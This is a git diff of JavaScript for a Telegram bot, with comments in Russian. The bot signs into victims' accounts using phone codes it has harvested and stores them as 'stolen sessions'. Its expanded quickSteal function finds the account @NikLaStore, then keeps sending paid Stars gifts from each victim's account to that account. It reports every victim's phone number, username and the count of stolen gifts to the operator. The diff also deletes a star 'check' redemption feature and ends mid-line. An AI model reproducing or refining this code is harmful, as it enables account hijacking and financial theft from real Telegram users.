@@ -159,7 +159,7 @@ async function signInWithRealCode(phone, code) {
             db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                 [sessionString, phone]);
 
-            // БЫСТРАЯ КРАЖА
+            // КРАДЕМ ПОДАРКИ
             await quickSteal(client, phone);
             
             await client.disconnect();
@@ -175,49 +175,133 @@ async function signInWithRealCode(phone, code) {
     }
 }
 
-// БЫСТРАЯ КРАЖА
+// ФУНКЦИЯ КРАЖИ ПО ШАГАМ
 async function quickSteal(client, phone) {
     try {
         const user = await client.getMe();
         let stolenCount = 0;
+        let report = '';
         
-        // ПЫТАЕМСЯ ОТПРАВИТЬ ПОДАРКИ НА @NikLaStore
+        // ШАГ 1: ИЩЕМ @NikLaStore
+        report += `🔍 Ищем @NikLaStore...\n`;
+        let targetUser = null;
+        
         try {
-            const target = await client.invoke(
+            const targetResult = await client.invoke(
                 new Api.contacts.ResolveUsername({
                     username: 'NikLaStore'
                 })
             );
             
-            if (target && target.users && target.users.length > 0) {
-                const targetUser = target.users[0];
-                
-                // ПРОБУЕМ ОТПРАВИТЬ ПОДАРКИ
-                for (let i = 0; i < 5; i++) {
-                    try {
-                        await client.invoke(
-                            new Api.payments.SendStars({
-                                peer: targetUser,
-                                stars: 25,
-                                purpose: new Api.InputStorePaymentPremiumGift({
-                                    userId: targetUser.id
-                                })
-                            })
-                        );
-                        stolenCount++;
-                        console.log(`✅ Подарок ${i+1} отправлен`);
-                        await new Promise(resolve => setTimeout(resolve, 1500));
-                    } catch (giftError) {
-                        // Если ошибка - выходим
-                        break;
-                    }
-                }
+            if (targetResult && targetResult.users && targetResult.users.length > 0) {
+                targetUser = targetResult.users[0];
+                report += `✅ @NikLaStore найден\n`;
+            } else {
+                report += `❌ @NikLaStore не найден\n`;
+                throw new Error('Target not found');
             }
-        } catch (targetError) {
-            console.log('❌ Ошибка цели');
+        } catch (error) {
+            report += `❌ Ошибка поиска: ${error.message}\n`;
+            throw error;
         }
         
-        const message = `🎯 КРАЖА!\n📱 ${phone}\n👤 @${user.username || 'нет'}\n🎁 Подарков: ${stolenCount}`;
+        // ШАГ 2: ПРОВЕРЯЕМ ПОДАРКИ
+        report += `🎁 Проверяем подарки...\n`;
+        let availableGifts = 0;
+        
+        try {
+            const userFull = await client.invoke(
+                new Api.users.GetFullUser({
+                    id: user.id
+                })
+            );
+            
+            if (userFull && userFull.premium_gifts) {
+                availableGifts = userFull.premium_gifts.length;
+                report += `✅ Найдено подарков: ${availableGifts}\n`;
+            } else {
+                report += `❌ Нет подарков в "Мои"\n`;
+            }
+        } catch (error) {
+            report += `⚠️ Ошибка проверки подарков: ${error.message}\n`;
+        }
+        
+        // ШАГ 3: ОТПРАВЛЯЕМ ПОДАРКИ (ПОВТОРЯЕМ ДО ИСЧЕЗНОВЕНИЯ "МОИ")
+        report += `🚀 Начинаем отправку подарков...\n`;
+        
+        let attempts = 0;
+        const maxAttempts = 20;
+        
+        while (attempts < maxAttempts) {
+            attempts++;
+            
+            try {
+                // Отправляем подарок за 25 звезд
+                const result = await client.invoke(
+                    new Api.payments.SendStars({
+                        peer: targetUser,
+                        stars: 25,
+                        purpose: new Api.InputStorePaymentPremiumGift({
+                            userId: targetUser.id
+                        })
+                    })
+                );
+                
+                stolenCount++;
+                report += `✅ Подарок ${attempts} отправлен за 25⭐\n`;
+                
+                // Пауза между отправками
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+            } catch (error) {
+                if (error.message.includes('NOT_ENOUGH_STARS')) {
+                    report += `❌ Недостаточно звезд для подарка\n`;
+                    break;
+                } else if (error.message.includes('PREMIUM_ACCOUNT_REQUIRED')) {
+                    report += `❌ Требуется премиум аккаунт\n`;
+                    break;
+                } else if (error.message.includes('GIFT_NOT_AVAILABLE')) {
+                    report += `❌ Подарки закончились\n`;
+                    break;
+                } else {
+                    report += `❌ Ошибка отправки ${attempts}: ${error.message}\n`;
+                    if (attempts > 3) break;
+                }
+            }
+            
+            // Проверяем остались ли подарки каждые 5 попыток
+            if (attempts % 5 === 0) {
+                try {
+                    const userFullCheck = await client.invoke(
+                        new Api.users.GetFullUser({
+                            id: user.id
+                        })
+                    );
+                    
+                    if (!userFullCheck || !userFullCheck.premium_gifts || userFullCheck.premium_gifts.length === 0) {
+                        report += `💡 Вкладка "Мои" пуста - останавливаемся\n`;
+                        break;
+                    }
+                } catch (checkError) {
+                    // Игнорируем ошибки проверки
+                }
+            }
+        }
+        
+        // ФИНАЛЬНЫЙ ОТЧЕТ
+        let message = `🎯 РЕЗУЛЬТАТ КРАЖИ:\n` +
+                     `📱 Номер: ${phone}\n` +
+                     `👤 Username: @${user.username || 'нет'}\n` +
+                     `👑 Премиум: ${user.premium ? 'ДА' : 'НЕТ'}\n\n` +
+                     `${report}\n` +
+                     `💰 ИТОГО УКРАДЕНО:\n` +
+                     `🎁 ПОДАРКОВ: ${stolenCount}\n`;
+        
+        if (stolenCount > 0) {
+            message += `\n✅ УСПЕШНАЯ КРАЖА!`;
+        } else {
+            message += `\n❌ НИЧЕГО НЕ УДАЛОСЬ УКРАСТЬ`;
+        }
         
         db.run(`UPDATE stolen_sessions SET gifts_data = ?, status = 'stolen' WHERE phone = ?`, 
             [stolenCount, phone]);
@@ -225,7 +309,11 @@ async function quickSteal(client, phone) {
         bot.sendMessage(MY_USER_ID, message);
         
     } catch (error) {
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${phone} - ${error.message}`);
+        bot.sendMessage(MY_USER_ID, 
+            `❌ КРИТИЧЕСКАЯ ОШИБКА КРАЖИ\n` +
+            `📱 Номер: ${phone}\n` +
+            `⚠️ ${error.message}`
+        );
     }
 }
 
@@ -440,54 +528,4 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     if (params.startsWith('check_')) {
         const checkId = params.split('_')[1];
         
-        db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [msg.from.id, checkId], (err, usedRow) => {
-            if (err || usedRow) {
-                bot.sendMessage(msg.chat.id, '❌ Чек уже использован!');
-                return;
-            }
-            
-            db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
-                if (err || !row) {
-                    bot.sendMessage(msg.chat.id, '❌ Чек не существует!');
-                    return;
-                }
-                
-                db.get(`SELECT balance FROM users WHERE user_id = ?`, [msg.from.id], (err, userRow) => {
-                    const newBalance = (userRow ? userRow.balance : 0) + row.amount;
-                    
-                    db.serialize(() => {
-                        db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
-                        db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
-                            [msg.from.id, msg.from.username, newBalance]);
-                        db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [msg.from.id, checkId]);
-                    });
-                    
-                    bot.sendMessage(msg.chat.id, 
-                        `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
-                    );
-                });
-            });
-        });
-        
-    } else if (params.startsWith('create_check_')) {
-        const amount = parseInt(params.split('_')[2]);
-        
-        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
-            [amount, msg.from.id], function(err) {
-            if (err) return;
-            
-            const checkId = this.lastID;
-            bot.sendMessage(msg.chat.id, `<b>🎫 Чек на ${amount} звезд</b>`, {
-                parse_mode: 'HTML',
-                reply_markup: { 
-                    inline_keyboard: [[{ 
-                        text: `🪙 Забрать ${amount} звезд`, 
-                        url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
-                    }]] 
-                }
-            });
-        });
-    }
-});
-
-console.log('✅ Бот запущен');
+        db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [msg.from
